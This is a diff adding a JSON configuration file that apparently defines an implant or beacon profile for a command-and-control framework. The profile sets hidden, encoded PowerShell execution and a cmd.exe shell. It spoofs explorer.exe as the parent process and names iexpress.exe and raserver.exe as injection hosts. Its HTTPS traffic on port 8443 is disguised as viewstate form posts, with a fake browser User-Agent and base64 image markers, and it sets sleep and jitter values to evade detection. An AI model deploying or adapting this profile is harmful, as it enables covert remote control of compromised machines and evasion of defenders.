@@ -1,0 +1,55 @@
+﻿{
+	"public_key": "",
+	"session": {
+		"expire": "2028-01-01 00:00:00",
+		"sleep": 1000,
+		"jitter": 10,
+		"shell": "%COMSPEC% /Q /K",
+		"powershell_arg": "-NoP -sta -NonI -W Hidden -Enc %s",
+		"exec": {
+			"process_parent": "explorer.exe",
+			"host_process": {
+				"x86": [
+					"%SystemRoot%\\SysWOW64\\iexpress.exe"
+				],
+				"x64": [
+					"%SystemRoot%\\System32\\raserver.exe"
+				]
+			}
+		}
+	},
+	"servers": {
+		"https": [
+			{
+				"address": "default",
+				"port": 8443,
+				"proxy": {},
+				"request": {
+					"session_cookie": "SSID",
+					"path": "/",
+					"data": {
+						"prepend": "viewstate=",
+						"append": "&action=view"
+					},
+					"headers": [
+						{ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36" },
+						{ "Cache-Control": "max-age=0" }
+					],
+					"cookies": []
+				},
+				"response": {
+					"status_code": 200,
+					"data": {
+						"start_marker": "data:image/png;base64,",
+						"end_marker": "\");}"
+					}
+				}
+			}
+		]
+	},
+	"data": {
+		"compress": 1,
+		"encode": 1,
+		"encrypt": 1
+	}
+}
